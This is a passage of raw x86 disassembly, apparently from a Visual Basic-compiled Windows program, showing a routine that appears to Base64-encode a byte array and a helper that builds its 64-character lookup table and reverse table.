  403273:	83 ec 0c             	sub    $0xc,%esp
  403276:	68 c6 11 40 00       	push   $0x4011c6
  40327b:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  403281:	50                   	push   %eax
  403282:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  403289:	81 ec 98 00 00 00    	sub    $0x98,%esp
  40328f:	53                   	push   %ebx
  403290:	56                   	push   %esi
  403291:	57                   	push   %edi
  403292:	89 65 f4             	mov    %esp,-0xc(%ebp)
  403295:	c7 45 f8 38 11 40 00 	movl   $0x401138,-0x8(%ebp)
  40329c:	33 db                	xor    %ebx,%ebx
  40329e:	33 f6                	xor    %esi,%esi
  4032a0:	66 39 1d 10 80 40 00 	cmp    %bx,0x408010
  4032a7:	89 5d e4             	mov    %ebx,-0x1c(%ebp)
  4032aa:	89 5d b8             	mov    %ebx,-0x48(%ebp)
  4032ad:	89 5d b4             	mov    %ebx,-0x4c(%ebp)
  4032b0:	89 5d a4             	mov    %ebx,-0x5c(%ebp)
  4032b3:	89 5d 94             	mov    %ebx,-0x6c(%ebp)
  4032b6:	89 5d 84             	mov    %ebx,-0x7c(%ebp)
  4032b9:	89 9d 74 ff ff ff    	mov    %ebx,-0x8c(%ebp)
  4032bf:	75 05                	jne    0x4032c6
  4032c1:	e8 ea 04 00 00       	call   0x4037b0
  4032c6:	8b 7d 0c             	mov    0xc(%ebp),%edi
  4032c9:	3b fb                	cmp    %ebx,%edi
  4032cb:	75 18                	jne    0x4032e5
  4032cd:	ba 84 23 40 00       	mov    $0x402384,%edx
  4032d2:	8d 4d b4             	lea    -0x4c(%ebp),%ecx
  4032d5:	ff 15 c8 10 40 00    	call   *0x4010c8
  4032db:	68 8b 37 40 00       	push   $0x40378b
  4032e0:	e9 99 04 00 00       	jmp    0x40377e
  4032e5:	8b cf                	mov    %edi,%ecx
  4032e7:	b8 56 55 55 55       	mov    $0x55555556,%eax
  4032ec:	6b c9 04             	imul   $0x4,%ecx,%ecx
  4032ef:	0f 80 ac 04 00 00    	jo     0x4037a1
  4032f5:	83 c1 02             	add    $0x2,%ecx
  4032f8:	53                   	push   %ebx
  4032f9:	0f 80 a2 04 00 00    	jo     0x4037a1
  4032ff:	f7 e9                	imul   %ecx
  403301:	8b c2                	mov    %edx,%eax
  403303:	8b cf                	mov    %edi,%ecx
  403305:	c1 e8 1f             	shr    $0x1f,%eax
  403308:	03 d0                	add    %eax,%edx
  40330a:	83 c1 02             	add    $0x2,%ecx
  40330d:	b8 56 55 55 55       	mov    $0x55555556,%eax
  403312:	89 55 bc             	mov    %edx,-0x44(%ebp)
  403315:	0f 80 86 04 00 00    	jo     0x4037a1
  40331b:	f7 e9                	imul   %ecx
  40331d:	8b ca                	mov    %edx,%ecx
  40331f:	c1 e9 1f             	shr    $0x1f,%ecx
  403322:	03 d1                	add    %ecx,%edx
  403324:	8b c2                	mov    %edx,%eax
  403326:	8d 55 b8             	lea    -0x48(%ebp),%edx
  403329:	6b c0 04             	imul   $0x4,%eax,%eax
  40332c:	0f 80 6f 04 00 00    	jo     0x4037a1
  403332:	83 e8 01             	sub    $0x1,%eax
  403335:	0f 80 66 04 00 00    	jo     0x4037a1
  40333b:	50                   	push   %eax
  40333c:	6a 01                	push   $0x1
  40333e:	6a 11                	push   $0x11
  403340:	52                   	push   %edx
  403341:	6a 01                	push   $0x1
  403343:	68 80 00 00 00       	push   $0x80
  403348:	ff 15 78 10 40 00    	call   *0x401078
  40334e:	8b 45 08             	mov    0x8(%ebp),%eax
  403351:	83 c4 1c             	add    $0x1c,%esp
  403354:	8b 08                	mov    (%eax),%ecx
  403356:	51                   	push   %ecx
  403357:	6a 01                	push   $0x1
  403359:	ff 15 70 10 40 00    	call   *0x401070
  40335f:	89 45 c0             	mov    %eax,-0x40(%ebp)
  403362:	3b f7                	cmp    %edi,%esi
  403364:	0f 8d d6 03 00 00    	jge    0x403740
  40336a:	8b 55 08             	mov    0x8(%ebp),%edx
  40336d:	8b 02                	mov    (%edx),%eax
  40336f:	3b c3                	cmp    %ebx,%eax
  403371:	74 29                	je     0x40339c
  403373:	66 83 38 01          	cmpw   $0x1,(%eax)
  403377:	75 23                	jne    0x40339c
  403379:	8b 5d c0             	mov    -0x40(%ebp),%ebx
  40337c:	8b 50 14             	mov    0x14(%eax),%edx
  40337f:	8b 48 10             	mov    0x10(%eax),%ecx
  403382:	03 de                	add    %esi,%ebx
  403384:	0f 80 17 04 00 00    	jo     0x4037a1
  40338a:	2b da                	sub    %edx,%ebx
  40338c:	3b d9                	cmp    %ecx,%ebx
  40338e:	72 06                	jb     0x403396
  403390:	ff 15 64 10 40 00    	call   *0x401064
  403396:	8b c3                	mov    %ebx,%eax
  403398:	33 db                	xor    %ebx,%ebx
  40339a:	eb 06                	jmp    0x4033a2
  40339c:	ff 15 64 10 40 00    	call   *0x401064
  4033a2:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4033a5:	83 c6 01             	add    $0x1,%esi
  4033a8:	0f 80 f3 03 00 00    	jo     0x4037a1
  4033ae:	8b 09                	mov    (%ecx),%ecx
  4033b0:	3b f7                	cmp    %edi,%esi
  4033b2:	89 75 d4             	mov    %esi,-0x2c(%ebp)
  4033b5:	8b 51 0c             	mov    0xc(%ecx),%edx
  4033b8:	8a 04 02             	mov    (%edx,%eax,1),%al
  4033bb:	88 45 d8             	mov    %al,-0x28(%ebp)
  4033be:	7d 53                	jge    0x403413
  4033c0:	3b cb                	cmp    %ebx,%ecx
  4033c2:	74 27                	je     0x4033eb
  4033c4:	66 83 39 01          	cmpw   $0x1,(%ecx)
  4033c8:	75 21                	jne    0x4033eb
  4033ca:	8b 5d c0             	mov    -0x40(%ebp),%ebx
  4033cd:	8b 51 14             	mov    0x14(%ecx),%edx
  4033d0:	8b 41 10             	mov    0x10(%ecx),%eax
  4033d3:	03 de                	add    %esi,%ebx
  4033d5:	0f 80 c6 03 00 00    	jo     0x4037a1
  4033db:	2b da                	sub    %edx,%ebx
  4033dd:	3b d8                	cmp    %eax,%ebx
  4033df:	72 06                	jb     0x4033e7
  4033e1:	ff 15 64 10 40 00    	call   *0x401064
  4033e7:	8b c3                	mov    %ebx,%eax
  4033e9:	eb 06                	jmp    0x4033f1
  4033eb:	ff 15 64 10 40 00    	call   *0x401064
  4033f1:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4033f4:	8b 3d 80 10 40 00    	mov    0x401080,%edi
  4033fa:	83 c6 01             	add    $0x1,%esi
  4033fd:	8b 11                	mov    (%ecx),%edx
  4033ff:	0f 80 9c 03 00 00    	jo     0x4037a1
  403405:	8b 4a 0c             	mov    0xc(%edx),%ecx
  403408:	89 75 d4             	mov    %esi,-0x2c(%ebp)
  40340b:	8a 14 01             	mov    (%ecx,%eax,1),%dl
  40340e:	88 55 c8             	mov    %dl,-0x38(%ebp)
  403411:	eb 0d                	jmp    0x403420
  403413:	8b 3d 80 10 40 00    	mov    0x401080,%edi
  403419:	33 c9                	xor    %ecx,%ecx
  40341b:	ff d7                	call   *%edi
  40341d:	88 45 c8             	mov    %al,-0x38(%ebp)
  403420:	3b 75 0c             	cmp    0xc(%ebp),%esi
  403423:	7d 4f                	jge    0x403474
  403425:	8b 45 08             	mov    0x8(%ebp),%eax
  403428:	8b 00                	mov    (%eax),%eax
  40342a:	85 c0                	test   %eax,%eax
  40342c:	74 27                	je     0x403455
  40342e:	66 83 38 01          	cmpw   $0x1,(%eax)
  403432:	75 21                	jne    0x403455
  403434:	8b 5d c0             	mov    -0x40(%ebp),%ebx
  403437:	8b 50 14             	mov    0x14(%eax),%edx
  40343a:	8b 48 10             	mov    0x10(%eax),%ecx
  40343d:	03 de                	add    %esi,%ebx
  40343f:	0f 80 5c 03 00 00    	jo     0x4037a1
  403445:	2b da                	sub    %edx,%ebx
  403447:	3b d9                	cmp    %ecx,%ebx
  403449:	72 06                	jb     0x403451
  40344b:	ff 15 64 10 40 00    	call   *0x401064
  403451:	8b c3                	mov    %ebx,%eax
  403453:	eb 06                	jmp    0x40345b
  403455:	ff 15 64 10 40 00    	call   *0x401064
  40345b:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40345e:	83 c6 01             	add    $0x1,%esi
  403461:	0f 80 3a 03 00 00    	jo     0x4037a1
  403467:	8b 11                	mov    (%ecx),%edx
  403469:	89 75 d4             	mov    %esi,-0x2c(%ebp)
  40346c:	8b 4a 0c             	mov    0xc(%edx),%ecx
  40346f:	8a 1c 01             	mov    (%ecx,%eax,1),%bl
  403472:	eb 06                	jmp    0x40347a
  403474:	33 c9                	xor    %ecx,%ecx
  403476:	ff d7                	call   *%edi
  403478:	8a d8                	mov    %al,%bl
  40347a:	8a 55 d8             	mov    -0x28(%ebp),%dl
  40347d:	66 33 c9             	xor    %cx,%cx
  403480:	c0 ea 02             	shr    $0x2,%dl
  403483:	8a ca                	mov    %dl,%cl
  403485:	ff d7                	call   *%edi
  403487:	88 45 e8             	mov    %al,-0x18(%ebp)
  40348a:	8a 45 d8             	mov    -0x28(%ebp),%al
  40348d:	24 03                	and    $0x3,%al
  40348f:	66 33 c9             	xor    %cx,%cx
  403492:	8a c8                	mov    %al,%cl
  403494:	8a 45 c8             	mov    -0x38(%ebp),%al
  403497:	66 6b c9 10          	imul   $0x10,%cx,%cx
  40349b:	0f 80 00 03 00 00    	jo     0x4037a1
  4034a1:	c0 e8 04             	shr    $0x4,%al
  4034a4:	66 33 d2             	xor    %dx,%dx
  4034a7:	8a d0                	mov    %al,%dl
  4034a9:	0b ca                	or     %edx,%ecx
  4034ab:	ff d7                	call   *%edi
  4034ad:	88 45 e0             	mov    %al,-0x20(%ebp)
  4034b0:	8a 45 c8             	mov    -0x38(%ebp),%al
  4034b3:	24 0f                	and    $0xf,%al
  4034b5:	66 33 c9             	xor    %cx,%cx
  4034b8:	8a c8                	mov    %al,%cl
  4034ba:	8a c3                	mov    %bl,%al
  4034bc:	66 6b c9 04          	imul   $0x4,%cx,%cx
  4034c0:	0f 80 db 02 00 00    	jo     0x4037a1
  4034c6:	c0 e8 06             	shr    $0x6,%al
  4034c9:	66 33 d2             	xor    %dx,%dx
  4034cc:	8a d0                	mov    %al,%dl
  4034ce:	0b ca                	or     %edx,%ecx
  4034d0:	ff d7                	call   *%edi
  4034d2:	80 e3 3f             	and    $0x3f,%bl
  4034d5:	66 33 c9             	xor    %cx,%cx
  4034d8:	8a cb                	mov    %bl,%cl
  4034da:	88 45 dc             	mov    %al,-0x24(%ebp)
  4034dd:	ff d7                	call   *%edi
  4034df:	8b 5d e8             	mov    -0x18(%ebp),%ebx
  4034e2:	8b 3d 64 10 40 00    	mov    0x401064,%edi
  4034e8:	81 e3 ff 00 00 00    	and    $0xff,%ebx
  4034ee:	88 45 cc             	mov    %al,-0x34(%ebp)
  4034f1:	83 fb 40             	cmp    $0x40,%ebx
  4034f4:	72 02                	jb     0x4034f8
  4034f6:	ff d7                	call   *%edi
  4034f8:	8b 4d b8             	mov    -0x48(%ebp),%ecx
  4034fb:	85 c9                	test   %ecx,%ecx
  4034fd:	74 2a                	je     0x403529
  4034ff:	66 83 39 01          	cmpw   $0x1,(%ecx)
  403503:	75 24                	jne    0x403529
  403505:	8b 75 e4             	mov    -0x1c(%ebp),%esi
  403508:	8b 51 14             	mov    0x14(%ecx),%edx
  40350b:	8b 41 10             	mov    0x10(%ecx),%eax
  40350e:	8b fe                	mov    %esi,%edi
  403510:	2b fa                	sub    %edx,%edi
  403512:	3b f8                	cmp    %eax,%edi
  403514:	72 09                	jb     0x40351f
  403516:	ff 15 64 10 40 00    	call   *0x401064
  40351c:	8b 4d b8             	mov    -0x48(%ebp),%ecx
  40351f:	8b c7                	mov    %edi,%eax
  403521:	8b 3d 64 10 40 00    	mov    0x401064,%edi
  403527:	eb 08                	jmp    0x403531
  403529:	ff d7                	call   *%edi
  40352b:	8b 4d b8             	mov    -0x48(%ebp),%ecx
  40352e:	8b 75 e4             	mov    -0x1c(%ebp),%esi
  403531:	8b 15 24 80 40 00    	mov    0x408024,%edx
  403537:	8b 49 0c             	mov    0xc(%ecx),%ecx
  40353a:	83 c6 01             	add    $0x1,%esi
  40353d:	8a 14 1a             	mov    (%edx,%ebx,1),%dl
  403540:	8b 5d e0             	mov    -0x20(%ebp),%ebx
  403543:	0f 80 58 02 00 00    	jo     0x4037a1
  403549:	81 e3 ff 00 00 00    	and    $0xff,%ebx
  40354f:	88 14 01             	mov    %dl,(%ecx,%eax,1)
  403552:	83 fb 40             	cmp    $0x40,%ebx
  403555:	72 02                	jb     0x403559
  403557:	ff d7                	call   *%edi
  403559:	8b 4d b8             	mov    -0x48(%ebp),%ecx
  40355c:	85 c9                	test   %ecx,%ecx
  40355e:	74 21                	je     0x403581
  403560:	66 83 39 01          	cmpw   $0x1,(%ecx)
  403564:	75 1b                	jne    0x403581
  403566:	8b 51 14             	mov    0x14(%ecx),%edx
  403569:	8b 41 10             	mov    0x10(%ecx),%eax
  40356c:	8b fe                	mov    %esi,%edi
  40356e:	2b fa                	sub    %edx,%edi
  403570:	3b f8                	cmp    %eax,%edi
  403572:	72 09                	jb     0x40357d
  403574:	ff 15 64 10 40 00    	call   *0x401064
  40357a:	8b 4d b8             	mov    -0x48(%ebp),%ecx
  40357d:	8b c7                	mov    %edi,%eax
  40357f:	eb 05                	jmp    0x403586
  403581:	ff d7                	call   *%edi
  403583:	8b 4d b8             	mov    -0x48(%ebp),%ecx
  403586:	8b 15 24 80 40 00    	mov    0x408024,%edx
  40358c:	8b 49 0c             	mov    0xc(%ecx),%ecx
  40358f:	83 c6 01             	add    $0x1,%esi
  403592:	68 8c 23 40 00       	push   $0x40238c
  403597:	8a 14 1a             	mov    (%edx,%ebx,1),%dl
  40359a:	88 14 01             	mov    %dl,(%ecx,%eax,1)
  40359d:	0f 80 fe 01 00 00    	jo     0x4037a1
  4035a3:	ff 15 28 10 40 00    	call   *0x401028
  4035a9:	8b 7d dc             	mov    -0x24(%ebp),%edi
  4035ac:	8b 1d 64 10 40 00    	mov    0x401064,%ebx
  4035b2:	81 e7 ff 00 00 00    	and    $0xff,%edi
  4035b8:	66 89 45 ac          	mov    %ax,-0x54(%ebp)
  4035bc:	83 ff 40             	cmp    $0x40,%edi
  4035bf:	c7 45 a4 02 00 00 00 	movl   $0x2,-0x5c(%ebp)
  4035c6:	72 02                	jb     0x4035ca
  4035c8:	ff d3                	call   *%ebx
  4035ca:	a1 24 80 40 00       	mov    0x408024,%eax
  4035cf:	8b 55 bc             	mov    -0x44(%ebp),%edx
  4035d2:	03 c7                	add    %edi,%eax
  4035d4:	33 c9                	xor    %ecx,%ecx
  4035d6:	3b f2                	cmp    %edx,%esi
  4035d8:	89 85 7c ff ff ff    	mov    %eax,-0x84(%ebp)
  4035de:	0f 9c c1             	setl   %cl
  4035e1:	f7 d9                	neg    %ecx
  4035e3:	8d 55 a4             	lea    -0x5c(%ebp),%edx
  4035e6:	66 89 4d 8c          	mov    %cx,-0x74(%ebp)
  4035ea:	8d 85 74 ff ff ff    	lea    -0x8c(%ebp),%eax
  4035f0:	52                   	push   %edx
  4035f1:	8d 4d 84             	lea    -0x7c(%ebp),%ecx
  4035f4:	50                   	push   %eax
  4035f5:	8d 55 94             	lea    -0x6c(%ebp),%edx
  4035f8:	51                   	push   %ecx
  4035f9:	52                   	push   %edx
  4035fa:	c7 85 74 ff ff ff 11 	movl   $0x4011,-0x8c(%ebp)
  403601:	40 00 00 
  403604:	c7 45 84 0b 00 00 00 	movl   $0xb,-0x7c(%ebp)
  40360b:	ff 15 cc 10 40 00    	call   *0x4010cc
  403611:	8b 45 b8             	mov    -0x48(%ebp),%eax
  403614:	85 c0                	test   %eax,%eax
  403616:	74 18                	je     0x403630
  403618:	66 83 38 01          	cmpw   $0x1,(%eax)
  40361c:	75 12                	jne    0x403630
  40361e:	8b 50 14             	mov    0x14(%eax),%edx
  403621:	8b 48 10             	mov    0x10(%eax),%ecx
  403624:	8b fe                	mov    %esi,%edi
  403626:	2b fa                	sub    %edx,%edi
  403628:	3b f9                	cmp    %ecx,%edi
  40362a:	72 08                	jb     0x403634
  40362c:	ff d3                	call   *%ebx
  40362e:	eb 04                	jmp    0x403634
  403630:	ff d3                	call   *%ebx
  403632:	8b f8                	mov    %eax,%edi
  403634:	8b 1d 00 11 40 00    	mov    0x401100,%ebx
  40363a:	8d 45 94             	lea    -0x6c(%ebp),%eax
  40363d:	50                   	push   %eax
  40363e:	ff d3                	call   *%ebx
  403640:	8b 4d b8             	mov    -0x48(%ebp),%ecx
  403643:	8b 51 0c             	mov    0xc(%ecx),%edx
  403646:	8d 4d a4             	lea    -0x5c(%ebp),%ecx
  403649:	88 04 3a             	mov    %al,(%edx,%edi,1)
  40364c:	8d 45 94             	lea    -0x6c(%ebp),%eax
  40364f:	50                   	push   %eax
  403650:	8d 55 84             	lea    -0x7c(%ebp),%edx
  403653:	51                   	push   %ecx
  403654:	52                   	push   %edx
  403655:	6a 03                	push   $0x3
  403657:	ff 15 1c 10 40 00    	call   *0x40101c
  40365d:	83 c4 10             	add    $0x10,%esp
  403660:	83 c6 01             	add    $0x1,%esi
  403663:	0f 80 38 01 00 00    	jo     0x4037a1
  403669:	68 8c 23 40 00       	push   $0x40238c
  40366e:	ff 15 28 10 40 00    	call   *0x401028
  403674:	8b 7d cc             	mov    -0x34(%ebp),%edi
  403677:	66 89 45 ac          	mov    %ax,-0x54(%ebp)
  40367b:	81 e7 ff 00 00 00    	and    $0xff,%edi
  403681:	c7 45 a4 02 00 00 00 	movl   $0x2,-0x5c(%ebp)
  403688:	83 ff 40             	cmp    $0x40,%edi
  40368b:	72 06                	jb     0x403693
  40368d:	ff 15 64 10 40 00    	call   *0x401064
  403693:	a1 24 80 40 00       	mov    0x408024,%eax
  403698:	8b 55 bc             	mov    -0x44(%ebp),%edx
  40369b:	03 c7                	add    %edi,%eax
  40369d:	33 c9                	xor    %ecx,%ecx
  40369f:	3b f2                	cmp    %edx,%esi
  4036a1:	89 85 7c ff ff ff    	mov    %eax,-0x84(%ebp)
  4036a7:	0f 9c c1             	setl   %cl
  4036aa:	f7 d9                	neg    %ecx
  4036ac:	8d 55 a4             	lea    -0x5c(%ebp),%edx
  4036af:	66 89 4d 8c          	mov    %cx,-0x74(%ebp)
  4036b3:	8d 85 74 ff ff ff    	lea    -0x8c(%ebp),%eax
  4036b9:	52                   	push   %edx
  4036ba:	8d 4d 84             	lea    -0x7c(%ebp),%ecx
  4036bd:	50                   	push   %eax
  4036be:	8d 55 94             	lea    -0x6c(%ebp),%edx
  4036c1:	51                   	push   %ecx
  4036c2:	52                   	push   %edx
  4036c3:	c7 85 74 ff ff ff 11 	movl   $0x4011,-0x8c(%ebp)
  4036ca:	40 00 00 
  4036cd:	c7 45 84 0b 00 00 00 	movl   $0xb,-0x7c(%ebp)
  4036d4:	ff 15 cc 10 40 00    	call   *0x4010cc
  4036da:	8b 45 b8             	mov    -0x48(%ebp),%eax
  4036dd:	85 c0                	test   %eax,%eax
  4036df:	74 1c                	je     0x4036fd
  4036e1:	66 83 38 01          	cmpw   $0x1,(%eax)
  4036e5:	75 16                	jne    0x4036fd
  4036e7:	8b 50 14             	mov    0x14(%eax),%edx
  4036ea:	8b 48 10             	mov    0x10(%eax),%ecx
  4036ed:	8b fe                	mov    %esi,%edi
  4036ef:	2b fa                	sub    %edx,%edi
  4036f1:	3b f9                	cmp    %ecx,%edi
  4036f3:	72 10                	jb     0x403705
  4036f5:	ff 15 64 10 40 00    	call   *0x401064
  4036fb:	eb 08                	jmp    0x403705
  4036fd:	ff 15 64 10 40 00    	call   *0x401064
  403703:	8b f8                	mov    %eax,%edi
  403705:	8d 45 94             	lea    -0x6c(%ebp),%eax
  403708:	50                   	push   %eax
  403709:	ff d3                	call   *%ebx
  40370b:	8b 4d b8             	mov    -0x48(%ebp),%ecx
  40370e:	8b 51 0c             	mov    0xc(%ecx),%edx
  403711:	8d 4d a4             	lea    -0x5c(%ebp),%ecx
  403714:	88 04 3a             	mov    %al,(%edx,%edi,1)
  403717:	8d 45 94             	lea    -0x6c(%ebp),%eax
  40371a:	50                   	push   %eax
  40371b:	8d 55 84             	lea    -0x7c(%ebp),%edx
  40371e:	51                   	push   %ecx
  40371f:	52                   	push   %edx
  403720:	6a 03                	push   $0x3
  403722:	ff 15 1c 10 40 00    	call   *0x40101c
  403728:	8b 7d 0c             	mov    0xc(%ebp),%edi
  40372b:	83 c4 10             	add    $0x10,%esp
  40372e:	83 c6 01             	add    $0x1,%esi
  403731:	70 6e                	jo     0x4037a1
  403733:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  403736:	8b 75 d4             	mov    -0x2c(%ebp),%esi
  403739:	33 db                	xor    %ebx,%ebx
  40373b:	e9 22 fc ff ff       	jmp    0x403362
  403740:	8d 45 b8             	lea    -0x48(%ebp),%eax
  403743:	50                   	push   %eax
  403744:	e8 b7 04 00 00       	call   0x403c00
  403749:	8b d0                	mov    %eax,%edx
  40374b:	8d 4d b4             	lea    -0x4c(%ebp),%ecx
  40374e:	ff 15 f0 10 40 00    	call   *0x4010f0
  403754:	68 8b 37 40 00       	push   $0x40378b
  403759:	eb 23                	jmp    0x40377e
  40375b:	f6 45 fc 04          	testb  $0x4,-0x4(%ebp)
  40375f:	74 09                	je     0x40376a
  403761:	8d 4d b4             	lea    -0x4c(%ebp),%ecx
  403764:	ff 15 08 11 40 00    	call   *0x401108
  40376a:	8d 4d 94             	lea    -0x6c(%ebp),%ecx
  40376d:	8d 55 a4             	lea    -0x5c(%ebp),%edx
  403770:	51                   	push   %ecx
  403771:	52                   	push   %edx
  403772:	6a 02                	push   $0x2
  403774:	ff 15 1c 10 40 00    	call   *0x40101c
  40377a:	83 c4 0c             	add    $0xc,%esp
  40377d:	c3                   	ret
  40377e:	8d 45 b8             	lea    -0x48(%ebp),%eax
  403781:	50                   	push   %eax
  403782:	6a 00                	push   $0x0
  403784:	ff 15 44 10 40 00    	call   *0x401044
  40378a:	c3                   	ret
  40378b:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  40378e:	8b 45 b4             	mov    -0x4c(%ebp),%eax
  403791:	5f                   	pop    %edi
  403792:	5e                   	pop    %esi
  403793:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40379a:	5b                   	pop    %ebx
  40379b:	8b e5                	mov    %ebp,%esp
  40379d:	5d                   	pop    %ebp
  40379e:	c2 08 00             	ret    $0x8
  4037a1:	ff 15 b8 10 40 00    	call   *0x4010b8
  4037a7:	90                   	nop
  4037a8:	90                   	nop
  4037a9:	90                   	nop
  4037aa:	90                   	nop
  4037ab:	90                   	nop
  4037ac:	90                   	nop
  4037ad:	90                   	nop
  4037ae:	90                   	nop
  4037af:	90                   	nop
  4037b0:	51                   	push   %ecx
  4037b1:	53                   	push   %ebx
  4037b2:	55                   	push   %ebp
  4037b3:	56                   	push   %esi
  4037b4:	57                   	push   %edi
  4037b5:	8b 3d 28 10 40 00    	mov    0x401028,%edi
  4037bb:	68 84 24 40 00       	push   $0x402484
  4037c0:	33 f6                	xor    %esi,%esi
  4037c2:	ff d7                	call   *%edi
  4037c4:	68 24 24 40 00       	push   $0x402424
  4037c9:	8b e8                	mov    %eax,%ebp
  4037cb:	ff d7                	call   *%edi
  4037cd:	8b 1d 80 10 40 00    	mov    0x401080,%ebx
  4037d3:	8b f8                	mov    %eax,%edi
  4037d5:	66 3b fd             	cmp    %bp,%di
  4037d8:	7f 37                	jg     0x403811
  4037da:	0f bf c6             	movswl %si,%eax
  4037dd:	83 f8 40             	cmp    $0x40,%eax
  4037e0:	72 06                	jb     0x4037e8
  4037e2:	ff 15 64 10 40 00    	call   *0x401064
  4037e8:	8b cf                	mov    %edi,%ecx
  4037ea:	ff d3                	call   *%ebx
  4037ec:	8b 15 24 80 40 00    	mov    0x408024,%edx
  4037f2:	0f bf ce             	movswl %si,%ecx
  4037f5:	66 83 c6 01          	add    $0x1,%si
  4037f9:	0f 80 9f 01 00 00    	jo     0x40399e
  4037ff:	66 83 c7 01          	add    $0x1,%di
  403803:	88 04 0a             	mov    %al,(%edx,%ecx,1)
  403806:	0f 80 92 01 00 00    	jo     0x40399e
  40380c:	66 3b fd             	cmp    %bp,%di
  40380f:	7e c9                	jle    0x4037da
  403811:	8b 2d 28 10 40 00    	mov    0x401028,%ebp
  403817:	68 94 24 40 00       	push   $0x402494
  40381c:	ff d5                	call   *%ebp
  40381e:	68 8c 24 40 00       	push   $0x40248c
  403823:	89 44 24 14          	mov    %eax,0x14(%esp)
  403827:	ff d5                	call   *%ebp
  403829:	8b f8                	mov    %eax,%edi
  40382b:	66 3b 7c 24 10       	cmp    0x10(%esp),%di
  403830:	7f 3c                	jg     0x40386e
  403832:	0f bf ee             	movswl %si,%ebp
  403835:	83 fd 40             	cmp    $0x40,%ebp
  403838:	72 06                	jb     0x403840
  40383a:	ff 15 64 10 40 00    	call   *0x401064
  403840:	8b cf                	mov    %edi,%ecx
  403842:	ff d3                	call   *%ebx
  403844:	8b 0d 24 80 40 00    	mov    0x408024,%ecx
  40384a:	66 83 c6 01          	add    $0x1,%si
  40384e:	0f 80 4a 01 00 00    	jo     0x40399e
  403854:	66 83 c7 01          	add    $0x1,%di
  403858:	88 04 29             	mov    %al,(%ecx,%ebp,1)
  40385b:	0f 80 3d 01 00 00    	jo     0x40399e
  403861:	66 3b 7c 24 10       	cmp    0x10(%esp),%di
  403866:	7e ca                	jle    0x403832
  403868:	8b 2d 28 10 40 00    	mov    0x401028,%ebp
  40386e:	68 a4 24 40 00       	push   $0x4024a4
  403873:	ff d5                	call   *%ebp
  403875:	68 9c 24 40 00       	push   $0x40249c
  40387a:	89 44 24 14          	mov    %eax,0x14(%esp)
  40387e:	ff d5                	call   *%ebp
  403880:	8b f8                	mov    %eax,%edi
  403882:	66 3b 7c 24 10       	cmp    0x10(%esp),%di
  403887:	7f 3c                	jg     0x4038c5
  403889:	0f bf ee             	movswl %si,%ebp
  40388c:	83 fd 40             	cmp    $0x40,%ebp
  40388f:	72 06                	jb     0x403897
  403891:	ff 15 64 10 40 00    	call   *0x401064
  403897:	8b cf                	mov    %edi,%ecx
  403899:	ff d3                	call   *%ebx
  40389b:	8b 15 24 80 40 00    	mov    0x408024,%edx
  4038a1:	66 83 c6 01          	add    $0x1,%si
  4038a5:	0f 80 f3 00 00 00    	jo     0x40399e
  4038ab:	66 83 c7 01          	add    $0x1,%di
  4038af:	88 04 2a             	mov    %al,(%edx,%ebp,1)
  4038b2:	0f 80 e6 00 00 00    	jo     0x40399e
  4038b8:	66 3b 7c 24 10       	cmp    0x10(%esp),%di
  4038bd:	7e ca                	jle    0x403889
  4038bf:	8b 2d 28 10 40 00    	mov    0x401028,%ebp
  4038c5:	0f bf fe             	movswl %si,%edi
  4038c8:	83 ff 40             	cmp    $0x40,%edi
  4038cb:	72 06                	jb     0x4038d3
  4038cd:	ff 15 64 10 40 00    	call   *0x401064
  4038d3:	68 ac 24 40 00       	push   $0x4024ac
  4038d8:	ff d5                	call   *%ebp
  4038da:	8b c8                	mov    %eax,%ecx
  4038dc:	ff d3                	call   *%ebx
  4038de:	8b 0d 24 80 40 00    	mov    0x408024,%ecx
  4038e4:	66 83 c6 01          	add    $0x1,%si
  4038e8:	0f 80 b0 00 00 00    	jo     0x40399e
  4038ee:	88 04 39             	mov    %al,(%ecx,%edi,1)
  4038f1:	0f bf fe             	movswl %si,%edi
  4038f4:	83 ff 40             	cmp    $0x40,%edi
  4038f7:	72 06                	jb     0x4038ff
  4038f9:	ff 15 64 10 40 00    	call   *0x401064
  4038ff:	68 b4 24 40 00       	push   $0x4024b4
  403904:	ff d5                	call   *%ebp
  403906:	8b c8                	mov    %eax,%ecx
  403908:	ff d3                	call   *%ebx
  40390a:	8b 15 24 80 40 00    	mov    0x408024,%edx
  403910:	66 83 c6 01          	add    $0x1,%si
  403914:	0f 80 84 00 00 00    	jo     0x40399e
  40391a:	88 04 3a             	mov    %al,(%edx,%edi,1)
  40391d:	33 f6                	xor    %esi,%esi
  40391f:	0f bf fe             	movswl %si,%edi
  403922:	81 ff 80 00 00 00    	cmp    $0x80,%edi
  403928:	72 06                	jb     0x403930
  40392a:	ff 15 64 10 40 00    	call   *0x401064
  403930:	b9 ff 00 00 00       	mov    $0xff,%ecx
  403935:	ff d3                	call   *%ebx
  403937:	8b 0d 40 80 40 00    	mov    0x408040,%ecx
  40393d:	66 83 c6 01          	add    $0x1,%si
  403941:	70 5b                	jo     0x40399e
  403943:	66 83 fe 7f          	cmp    $0x7f,%si
  403947:	88 04 39             	mov    %al,(%ecx,%edi,1)
  40394a:	7e d3                	jle    0x40391f
  40394c:	33 f6                	xor    %esi,%esi
  40394e:	0f bf fe             	movswl %si,%edi
  403951:	83 ff 40             	cmp    $0x40,%edi
  403954:	72 06                	jb     0x40395c
  403956:	ff 15 64 10 40 00    	call   *0x401064
  40395c:	a1 24 80 40 00       	mov    0x408024,%eax
  403961:	33 d2                	xor    %edx,%edx
  403963:	8a 14 38             	mov    (%eax,%edi,1),%dl
  403966:	8b fa                	mov    %edx,%edi
  403968:	81 ff 80 00 00 00    	cmp    $0x80,%edi
  40396e:	72 06                	jb     0x403976
  403970:	ff 15 64 10 40 00    	call   *0x401064
  403976:	8b ce                	mov    %esi,%ecx
  403978:	ff d3                	call   *%ebx
  40397a:	8b 0d 40 80 40 00    	mov    0x408040,%ecx
  403980:	66 83 c6 01          	add    $0x1,%si
  403984:	70 18                	jo     0x40399e
  403986:	66 83 fe 3f          	cmp    $0x3f,%si
  40398a:	88 04 39             	mov    %al,(%ecx,%edi,1)
  40398d:	7e bf                	jle    0x40394e
  40398f:	5f                   	pop    %edi
  403990:	5e                   	pop    %esi
